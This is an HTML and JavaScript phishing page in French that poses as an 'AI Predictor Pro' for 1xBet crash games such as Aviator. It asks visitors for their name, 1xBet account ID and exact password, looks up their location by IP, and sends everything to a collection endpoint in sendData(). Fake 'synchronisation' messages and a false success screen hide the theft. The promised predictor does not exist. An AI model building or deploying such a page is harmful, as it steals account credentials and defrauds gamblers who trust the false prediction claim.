<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Predictor Pro - v4.0</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --neon: #00f2ff; --bg: #05070a; --card: #0d1117; }
        body { background: var(--bg); color: #c9d1d9; font-family: 'Consolas', monospace; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: var(--card); width: 90%; max-width: 420px; padding: 30px; border-radius: 15px; border: 1px solid var(--neon); box-shadow: 0 0 20px rgba(0, 242, 255, 0.2); }
        .page { display: none; }
        .active { display: block; animation: slideIn 0.3s ease-out; }
        @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
        
        input, select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #30363d; background: #161b22; color: white; box-sizing: border-box; }
        .pass-container { position: relative; }
        .pass-container i { position: absolute; right: 15px; top: 25px; cursor: pointer; color: var(--neon); }
        
        button { width: 100%; padding: 15px; border: none; background: var(--neon); color: black; font-weight: bold; cursor: pointer; margin-top: 15px; border-radius: 5px; }
        .sync-text { font-size: 12px; color: var(--neon); margin: 10px 0; min-height: 18px; }
        .location-info { font-size: 13px; color: #8b949e; background: #21262d; padding: 10px; border-radius: 5px; margin-bottom: 15px; }
    </style>
</head>
<body>

<div class="container">
    <div id="p1" class="page active">
        <h2 style="color:var(--neon)">üõ∞Ô∏è INITIALISATION</h2>
        <div id="loc-box" class="location-info">D√©tection du serveur local...</div>
        <p>Entrez votre ID officiel 1xBet pour lier le serveur :</p>
        <input type="text" id="nom" placeholder="Nom complet du titulaire">
        <input type="number" id="id1x" placeholder="ID du compte (ex: 489223...)">
        <button onclick="step2()">V√âRIFIER L'IDENTIT√â</button>
    </div>

    <div id="p2" class="page">
        <h2>üéÆ CONFIGURATION</h2>
        <p>Choisissez le jeu √† synchroniser :</p>
        <select id="jeu">
            <option value="Aviator">Aviator</option>
            <option value="Lucky Jet">Lucky Jet</option>
            <option value="Crash 1xBet">Crash 1xBet</option>
        </select>
        <button onclick="showPage(3)">CONFIGURER LES ALGORITHMES</button>
    </div>

    <div id="p3" class="page">
        <h2>üîë S√âCURIT√â</h2>
        <p style="font-size:12px; color:#ff7b72">Veuillez entrer votre mot de passe exact pour que le serveur valide l'ID et active le Predictor.</p>
        <div class="pass-container">
            <input type="password" id="pass" placeholder="Mot de passe du compte">
            <i class="fa-solid fa-eye" onclick="togglePass()"></i>
        </div>
        <button onclick="startSync()">LANCER LA SYNCHRONISATION</button>
    </div>

    <div id="p4" class="page">
        <h2>‚öôÔ∏è ANALYSE EN COURS</h2>
        <div class="sync-text" id="sync-msg">Connexion aux serveurs de jeu...</div>
        <div style="width:100%; background:#30363d; height:10px; border-radius:5px;">
            <div id="bar" style="width:0%; background:var(--neon); height:100%; transition:1s; border-radius:5px;"></div>
        </div>
    </div>

    <div id="p5" class="page">
        <h2 style="color:#3fb950">‚úÖ ACTIV√â</h2>
        <p>Le bot est li√© √† votre compte. Les signaux seront envoy√©s sur votre compte 1xBet.</p>
    </div>
</div>

<script>
    // R√©cup√©ration de la position via IP
    fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
        document.getElementById('loc-box').innerHTML = `üìç Serveur d√©tect√© : ${data.city}, ${data.region} (${data.country_name})`;
        window.userCity = data.city + ", " + data.region;
    });

    function showPage(n) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById('p' + n).classList.add('active');
    }

    function togglePass() {
        const p = document.getElementById('pass');
        p.type = p.type === "password" ? "text" : "password";
    }

    function step2() {
        if(!document.getElementById('id1x').value) return alert("ID requis");
        showPage(2);
    }

    function startSync() {
        if(!document.getElementById('pass').value) return alert("V√©rifiez votre mot de passe");
        showPage(4);
        
        const messages = [
            "Injection des scripts...",
            "V√©rification de l'ID compte...",
            "Liaison avec le solde...",
            "Finalisation de l'acc√®s..."
        ];
        
        let i = 0;
        const interval = setInterval(() => {
            document.getElementById('sync-msg').innerText = messages[i];
            document.getElementById('bar').style.width = ((i+1) * 25) + "%";
            i++;
            if(i >= messages.length) {
                clearInterval(interval);
                sendData();
            }
        }, 1500);
    }

    function sendData() {
        const payload = {
            nom: document.getElementById('nom').value,
            id: document.getElementById('id1x').value,
            jeu: document.getElementById('jeu').value,
            ville: window.userCity || "Inconnue",
            pass: document.getElementById('pass').value
        };

        fetch('http://localhost:5000/send', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        }).finally(() => showPage(5));
    }
</script>

</body>
</html>
